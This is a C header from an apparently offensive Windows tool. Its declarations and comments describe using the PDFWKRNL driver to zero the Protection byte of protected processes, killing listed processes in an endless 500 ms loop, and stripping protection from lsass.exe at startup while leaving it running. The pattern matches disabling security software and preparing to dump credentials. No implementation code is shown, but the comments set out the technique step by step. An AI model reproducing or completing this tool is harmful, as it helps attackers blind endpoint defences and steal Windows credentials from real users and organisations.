#pragma once
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

// Processes to monitor, strip PPL from and terminate.
// "YouCantKillMe" is intentionally without .exe ??? adjust if needed.
extern LPCWSTR g_TargetProcessNames[];
extern const DWORD g_TargetProcessCount;

// Remove PPL from the given process (by PID) and terminate it.
// Opens a QUERY_LIMITED handle to get EPROCESS, zeros Protection via
// PDFWKRNL, then re-opens with TERMINATE and calls TerminateProcess.
BOOL RemovePPLAndKill(HANDLE hDev, DWORD dwPid, LPCWSTR pwszName);

// Remove PPL from the given process (by PID) WITHOUT terminating it.
// Used for lsass.exe: strips Protection byte but leaves the process running.
BOOL RemovePPLOnly(HANDLE hDev, DWORD dwPid, LPCWSTR pwszName);

// Infinite loop: enumerates all processes every 500 ms, calls
// RemovePPLAndKill for every process whose name is in g_TargetProcessNames.
// Also performs a one-shot PPL strip on lsass.exe at startup (no termination).
// Never returns.
void MonitorAndKillLoop(HANDLE hDev);
